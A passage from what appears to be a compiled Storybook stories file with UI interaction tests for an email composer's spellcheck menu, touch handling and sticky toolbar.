      const found = spellNode(canvasElement, "[data-testid=spell-menu]");
      if (!found) throw new Error("the menu has not opened yet");
      return found;
    });

    // Portalled clear of the clipping ancestor rather than cut by it.
    await expect(frame.contains(menu)).toBe(false);
    const box = menu.getBoundingClientRect();
    await expect(box.left).toBeGreaterThanOrEqual(0);
    await expect(box.right).toBeLessThanOrEqual(window.innerWidth);
    await expect(spellNode(canvasElement, "[data-testid=spell-ignore]")?.textContent).toBe("Ignore for now");
  }
}`,...M.parameters?.docs?.source},description:{story:`A misspelt word at the right edge of a narrow, \`overflow-hidden\` editor —
the compose body's own shape (#731). The menu portals clear of that
ancestor rather than being clipped by it, and it stays inside the viewport
rather than running past the container's right edge and taking the page's
own scrollbar with it.`,...M.parameters?.docs?.description}}};I.parameters={...I.parameters,docs:{...I.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck ignores a word for the session",
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: workerSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
      timeout: 5000
    });
    clickOn(editable, "attachd");
    const [ignore] = await waitFor(() => {
      const rows = menuRows(canvasElement, "spell-ignore");
      expect(rows).toHaveLength(1);
      return rows;
    });
    if (!ignore) throw new Error("the menu offers no way to ignore");
    await userEvent.click(ignore);
    await waitFor(() => expect(spellMarks(editable).length).toBe(2));

    // Typed onto the end rather than clicked into: a click on this surface is
    // now how the corrections open, and it would take the keyboard with it.
    editable.focus();
    caretToEnd(editable);
    await userEvent.keyboard(" Attachd again.");
    await waitFor(() => expect(spellMarks(editable).filter(range => {
      const text = range.startContainer.textContent ?? "";
      return text.slice(range.startOffset, range.endOffset).toLowerCase() === "attachd";
    })).toHaveLength(0), {
      timeout: 5000
    });
  }
}`,...I.parameters?.docs?.source},description:{story:`Ignoring a word takes its marks off for as long as the composer is open, and
later passes over the same text leave it alone. Nothing is written down: the
next composer marks it again.`,...I.parameters?.docs?.description}}};L.parameters={...L.parameters,docs:{...L.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck opens on a click",
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: workerSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    const marked: [number, number][] = [[0, 3], [14, 18], [44, 51]];
    await waitFor(() => expect(spellMarkOffsets(editable)).toEqual(marked), {
      timeout: 5000
    });
    editable.focus();
    pressDownOn(editable, "redy");
    caretInto(editable, "redy");
    pressUpOn(editable, "redy");
    await waitFor(() => expect(spellNode(canvasElement, "[data-testid=spell-word]")?.textContent).toBe("redy"));
    // Long enough for the caret the click put down to have been read and
    // another checking pass to have gone by. It is still not what unmarks the
    // word: this is the writer looking at the corrections for it.
    await new Promise(rested => setTimeout(rested, 600));
    await expect(spellMarkOffsets(editable)).toEqual(marked);
    await userEvent.keyboard("{Escape}");
    await waitFor(() => expect(spellNode(canvasElement, "[data-testid=spell-menu]")).toBeNull());
    caretInto(editable, "redy");
    editable.dispatchEvent(new KeyboardEvent("keydown", {
      key: "ArrowLeft",
      bubbles: true
    }));
    await waitFor(() => expect(spellMarkOffsets(editable)).toEqual([[0, 3], [44, 51]]), {
      timeout: 5000
    });
  }
}`,...L.parameters?.docs?.source},description:{story:`A plain left click is what opens the corrections: a tablet has no right button
and nothing should be hidden behind one. The caret the click puts down is
reading rather than writing, so the squiggle it landed on stays where it is —
clicking a marked word must not be what unmarks it. The next key is the writer
back at the text, and the word under the caret goes quiet again.`,...L.parameters?.docs?.description}}};g.parameters={...g.parameters,docs:{...g.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck corrections on a phone",
  globals: {
    viewport: {
      value: "mobile"
    }
  },
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: workerSpellcheck
  },
  decorators: [Story => <div data-testid="body-area" className="relative flex h-[560px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas">
                <Story />
            </div>],
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
      timeout: 5000
    });
    tapOn(editable, "redy");
    await waitFor(() => expect(spellNode(canvasElement, "[data-testid=spell-menu]")).toBeTruthy());
    await expect(spellNode(canvasElement, "[aria-label='Close corrections']")).toBeTruthy();
  }
}`,...g.parameters?.docs?.source},description:{story:`The same rows below the desktop gate: a tap in a marked word raises the sheet
rather than a popover under the thumb that opened it.`,...g.parameters?.docs?.description}}};q.parameters={...q.parameters,docs:{...q.parameters?.docs,source:{originalSource:`{
  ...SpellcheckOnTouch,
  name: "Spellcheck leaves a drag and the right button alone",
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
      timeout: 5000
    });
    const menu = () => spellNode(canvasElement, "[data-testid=spell-menu]");
    pressOn(editable, "redy", {
      pointerType: "touch",
      travel: 40
    });
    await expect(menu()).toBeNull();
    pressOn(editable, "redy", {
      travel: 40
    });
    await expect(menu()).toBeNull();
    pressOn(editable, "redy", {
      button: 2
    });
    await expect(menu()).toBeNull();
    const contextMenu = new MouseEvent("contextmenu", {
      bubbles: true,
      cancelable: true,
      ...centreOf(markRect(editable, "redy"))
    });
    editable.dispatchEvent(contextMenu);
    await expect(contextMenu.defaultPrevented).toBe(false);
    await expect(menu()).toBeNull();
    tapOn(editable, "redy");
    await waitFor(() => expect(menu()).toBeTruthy());
    await userEvent.click(spellNode(canvasElement, "[aria-label='Close corrections']") as HTMLElement);
    await waitFor(() => expect(menu()).toBeNull());
    await waitFor(() => expect(document.activeElement).toBe(editable));
  }
}`,...q.parameters?.docs?.source},description:{story:`The other things a pointer does over a marked word: dragging out a selection
with either a finger or a mouse, and the right button, which belongs to the
browser's own menu. A sheet over the top of any of them is the one thing they
must not get. Closing the sheet hands the caret back.`,...q.parameters?.docs?.description}}};P.parameters={...P.parameters,docs:{...P.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck playground",
  render: () => <SpellcheckWorkbench />
}`,...P.parameters?.docs?.source}}};D.parameters={...D.parameters,docs:{...D.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck playground on a phone",
  globals: {
    viewport: {
      value: "mobile"
    }
  },
  render: () => <SpellcheckWorkbench />,
  decorators: [Story => <div data-testid="body-area" className="relative flex h-[640px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas">
                <Story />
            </div>]
}`,...D.parameters?.docs?.source}}};A.parameters={...A.parameters,docs:{...A.parameters?.docs,source:{originalSource:`{
  name: "Toolbar over a scrolled body",
  args: {
    initialHtml: \`\${RICH_DOCUMENT}\${"<p>Another line of the message.</p>".repeat(30)}\`,
    lang: "nl",
    trailing: pinnedControls
  },
  play: async ({
    canvasElement
  }) => {
    const frame = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const toggle = canvasElement.querySelector<HTMLElement>("[data-testid=compose-mode-toggle]");
    if (!frame || !toggle) throw new Error("the toolbar is not mounted");
    frame.scrollTop = 400;
    await expect(frame.scrollTop).toBeGreaterThan(0);
    await expect(toggle.getBoundingClientRect().top - frame.getBoundingClientRect().top).toBeLessThan(60);
  }
}`,...A.parameters?.docs?.source},description:{story:`The toolbar and the body share one scroller, so twenty lines of typing would
carry the toolbar off the top with them. It stays at the top of the body
while the text moves under it.`,...A.parameters?.docs?.description}}};const ze=["Empty","RichContent","PasteResult","PastedImages","ClickBelowTheText","ToolbarInRich","NarrowToolbar","SpellcheckMarks","SpellcheckDutch","SpellcheckSlowDownload","SpellcheckDownloadFailed","SpellcheckWithoutDictionary","SpellcheckStaleAnswer","SpellcheckSuggestions","SpellcheckNearRightEdge","SpellcheckSessionIgnore","SpellcheckClickOpensCorrections","SpellcheckOnTouch","SpellcheckLeavesAPointerAlone","SpellcheckPlayground","SpellcheckPlaygroundOnTouch","StickyToolbar"];export{f as ClickBelowTheText,N as Empty,S as NarrowToolbar,y as PasteResult,b as PastedImages,R as RichContent,L as SpellcheckClickOpensCorrections,T as SpellcheckDownloadFailed,v as SpellcheckDutch,q as SpellcheckLeavesAPointerAlone,x as SpellcheckMarks,M as SpellcheckNearRightEdge,g as SpellcheckOnTouch,P as SpellcheckPlayground,D as SpellcheckPlaygroundOnTouch,I as SpellcheckSessionIgnore,E as SpellcheckSlowDownload,C as SpellcheckStaleAnswer,H as SpellcheckSuggestions,B as SpellcheckWithoutDictionary,A as StickyToolbar,k as ToolbarInRich,ze as __namedExportsOrder,_e as default};
